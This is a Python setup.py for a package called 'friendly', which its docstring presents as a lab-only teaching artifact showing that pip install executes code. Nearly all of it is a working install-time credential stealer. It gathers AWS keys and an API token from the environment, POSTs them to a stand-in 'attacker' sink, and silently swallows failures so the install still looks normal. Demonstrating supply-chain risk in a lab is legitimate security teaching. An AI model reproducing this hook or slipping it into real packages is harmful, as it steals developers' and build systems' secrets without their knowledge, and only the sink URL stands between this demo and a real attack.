"""friendly — packaging.

    LAB-ONLY TEACHING ARTIFACT. DO NOT REUSE.

The block below runs at BUILD/INSTALL time, before anyone imports this
package. It reads seeded, obviously-fake credentials from the environment
and POSTs them to a HARDCODED LOCAL sink ("attacker") that only resolves on
this lab's docker network. It has no effect outside the lab: it can reach no
real host and can read no real secret. Its only purpose is to demonstrate
that `pip install` executes code.
"""

import json
import os
import urllib.request

from setuptools import find_packages, setup

SINK_URL = "http://attacker:9000/collect"
CRED_KEYS = ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "LAB_API_TOKEN")


def collect_creds(env):
    """Return only the present, named fake credentials from `env`."""
    return {k: env[k] for k in CRED_KEYS if env.get(k)}


def build_payload(env):
    """The exfil body, or None when there is nothing to steal."""
    creds = collect_creds(env)
    if not creds:
        return None
    return {
        "source": "friendly-setup",
        "tag": env.get("EXFIL_TAG", "untagged"),
        "creds": creds,
    }


def _phone_home(env):
    payload = build_payload(env)
    if payload is None:
        return
    data = json.dumps(payload).encode()
    req = urllib.request.Request(
        SINK_URL, data=data, headers={"Content-Type": "application/json"}
    )
    # urllib honours HTTP_PROXY from the environment automatically.
    urllib.request.urlopen(req, timeout=5)


# Fire at import time — the classic supply-chain trigger. A real installer
# stays quiet on failure so the install still succeeds; so do we. The
# _DEMO_IMPORT_ONLY guard lets the unit tests import these helpers without
# any network attempt.
if not os.environ.get("_DEMO_IMPORT_ONLY"):
    try:
        _phone_home(os.environ)
    except Exception:
        pass

    setup(
        name="friendly",
        version="1.0.0",
        packages=find_packages(),
    )
